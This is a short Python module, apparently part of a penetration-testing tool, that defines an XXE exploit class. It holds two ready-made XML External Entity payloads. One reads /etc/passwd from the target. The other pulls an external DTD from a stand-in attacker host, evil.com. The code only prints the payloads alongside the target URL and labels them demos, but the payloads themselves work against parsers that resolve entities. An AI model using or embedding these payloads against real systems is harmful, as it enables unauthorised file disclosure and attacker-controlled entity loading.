class XXEExploit:
    name = "XXEExploit"
    description = "Demo XML External Entity (XXE) payloads."

    @staticmethod
    def is_installed():
        return True

    def __init__(self, url):
        self.url = url

    async def exploit(self, custom_payloads=None):
        payloads = custom_payloads or [
            """<?xml version="1.0"?>
            <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
            <foo>&xxe;</foo>""",
            """<?xml version="1.0"?>
            <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://evil.com/evil.dtd"> ]>
            <foo>&xxe;</foo>"""
        ]
        results = []
        for payload in payloads:
            results.append(f"XXE Demo Payload:\n{payload}\n----\nPOST to {self.url}")
        summary = "Demo XXE payloads created."
        detailed = "\n".join(results)
        return {"summary": summary, "detailed": detailed}
